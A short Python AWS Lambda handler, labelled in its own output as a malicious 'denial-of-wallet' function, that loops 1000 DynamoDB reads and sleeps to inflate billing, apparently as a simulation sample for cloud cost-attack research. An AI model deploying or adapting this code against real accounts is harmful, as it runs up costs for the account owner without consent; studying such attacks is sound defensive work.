import boto3
import time

dynamodb = boto3.client("dynamodb")

def handler(event, context):
    print("Malicious Denial-of-Wallet Lambda executed")

    # Repeated DynamoDB operations to simulate excessive cost
    for i in range(1000):  # adjust to scale attack intensity
        dynamodb.get_item(
            TableName="vod-lavi-baseline",
            Key={"id": {"S": "123"}}
        )

    # Artificially increase duration to waste execution time
    time.sleep(5)  # 5 seconds pause
    
    return {"status": "malicious", "action": "denial-of-wallet"}
